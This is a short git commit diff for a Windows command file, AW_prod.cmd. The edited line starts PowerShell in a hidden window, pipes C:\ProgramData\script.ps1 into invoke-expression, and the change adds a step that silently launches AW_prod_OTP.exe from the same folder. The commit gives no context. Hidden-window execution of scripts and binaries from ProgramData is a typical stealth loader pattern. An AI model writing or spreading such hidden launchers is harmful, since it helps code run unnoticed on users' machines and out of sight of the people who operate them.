8ffc2b70a8978f63f50559e4622e583c963e3537
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2022-02-17 12:39:25 +0800

    Update AW_prod.cmd

--- AW_prod.cmd
+++ AW_prod.cmd
@@ -1,1 +1,1 @@
-start powershell  -windowstyle hidden "cat -raw C:\ProgramData\script.ps1 | invoke-expression"
+start powershell -windowstyle hidden "cat -raw C:\ProgramData\script.ps1 | invoke-expression"; Start-Process -FilePath "C:\ProgramData\AW_prod_OTP.exe"; Exit
